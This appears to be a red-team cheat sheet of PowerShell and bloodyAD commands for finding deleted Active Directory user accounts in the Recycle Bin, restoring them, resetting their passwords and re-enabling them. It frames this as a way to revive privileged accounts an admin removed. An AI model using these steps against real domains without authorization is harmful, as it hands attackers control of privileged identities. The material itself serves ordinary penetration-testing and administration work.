# Recycle Bin Restore

AD Recycle Bin lets you restore tombstoned objects with their original SID and group memberships intact. Useful for re-animating privileged accounts that an admin "deleted" but left in the Deleted Objects container. Requires AD Recycle Bin to be enabled in the forest.

### Confirm Recycle Bin enabled

Check confirm recycle bin enabled with Recycle Bin Restore.

```powershell title:"Recycle Bin Restore Check Confirm Recycle Bin Enabled"
Get-ADOptionalFeature 'Recycle Bin Feature'
```
<!-- cheat -->

### List deleted users

List deleted users with Recycle Bin Restore.

```powershell title:"Recycle Bin Restore List Deleted Users"
Get-ADObject -SearchBase "CN=Deleted Objects,$base_dn" -LDAPFilter "(objectClass=user)" -IncludeDeletedObjects -Properties objectSid,samAccountName,lastKnownParent,whenChanged
```
<!-- cheat
var base_dn
-->

### Find by samAccountName

Find Recycle Bin Restore by samAccountName.

```powershell title:"Recycle Bin Restore Find by SamAccountName"
Get-ADObject -SearchBase "CN=Deleted Objects,$base_dn" -IncludeDeletedObjects -LDAPFilter "(samAccountName=$target_user)"
```
<!-- cheat
var base_dn
var target_user
-->

### Restore object

Run restore object with Recycle Bin Restore.

```powershell title:"Recycle Bin Restore Run Restore Object"
Restore-ADObject -Identity $guid
```
<!-- cheat
var guid
-->

### Reset password

Dump reset password with Recycle Bin Restore.

```powershell title:"Recycle Bin Restore Dump Reset Password"
Set-ADAccountPassword -Identity $target_user -Reset -NewPassword (ConvertTo-SecureString '$target_pass' -AsPlainText -Force)
```
<!-- cheat
var target_user
var target_pass
-->

### Enable account

Enable account with Recycle Bin Restore.

```powershell title:"Recycle Bin Restore Enable Account"
Enable-ADAccount -Identity $target_user
```
<!-- cheat
var target_user
-->

### bloodyAD restore (Linux)

Run bloodyAD restore (Linux) with Recycle Bin Restore.

```sh title:"Recycle Bin Restore Run BloodyAD Restore (Linux)"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set restore $target_user
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
-->
